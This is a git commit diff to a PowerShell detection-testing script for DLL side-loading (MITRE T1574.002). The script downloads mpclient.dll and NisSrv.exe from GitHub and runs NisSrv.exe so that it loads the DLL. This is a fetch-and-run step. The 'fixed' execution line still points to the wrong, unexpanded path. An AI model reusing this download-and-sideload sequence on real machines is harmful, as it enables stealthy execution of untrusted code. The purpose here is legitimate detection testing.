68ed28efa0691eb68f21a31f68f35f8b77a6dc7e
Spencer Alessi <salessi@corp.securit360.com>
2022-08-03 09:41:24 -0400

    fixed execution

--- T1574.002/DLL_Sideloading_NisSrv.ps1
+++ T1574.002/DLL_Sideloading_NisSrv.ps1
@@ -1,11 +1,11 @@
 # Create folder on desktop for testing
-if (!(Test-Path "c:\$env:USERNAME\Desktop\DLL-Sideloading")){
-    New-Item -ItemType Directory "c:\$env:USERNAME\Desktop\DLL-Sideloading"
+if (!(Test-Path "c:\Users\$env:USERNAME\Desktop\DLL-Sideloading")){
+    New-Item -ItemType Directory "c:\Users\$env:USERNAME\Desktop\DLL-Sideloading"
 }
 
 # Download the necessary files
-Invoke-WebRequest "https://raw.githubusercontent.com/SecurIT360/TTP-Detection-Testing/main/T1574.002/mpclient.dll" -OutFile "c:\$env:USERNAME\Desktop\DLL-Sideloading\mpclient.dll"
-Invoke-WebRequest "https://raw.githubusercontent.com/SecurIT360/TTP-Detection-Testing/main/T1574.002/NisSrv.exe" -OutFile "c:\$env:USERNAME\Desktop\DLL-Sideloading\NisSrv.exe"
+Invoke-WebRequest "https://raw.githubusercontent.com/SecurIT360/TTP-Detection-Testing/main/T1574.002/mpclient.dll" -OutFile "c:\Users\$env:USERNAME\Desktop\DLL-Sideloading\mpclient.dll"
+Invoke-WebRequest "https://raw.githubusercontent.com/SecurIT360/TTP-Detection-Testing/main/T1574.002/NisSrv.exe" -OutFile "c:\Users\$env:USERNAME\Desktop\DLL-Sideloading\NisSrv.exe"
 
 # Execute
-"c:\$env:USERNAME\Desktop\DLL-Sideloading\NisSrv.exe"
+$(& 'c:\$env:USERNAME\Desktop\DLL-Sideloading\NisSrv.exe')
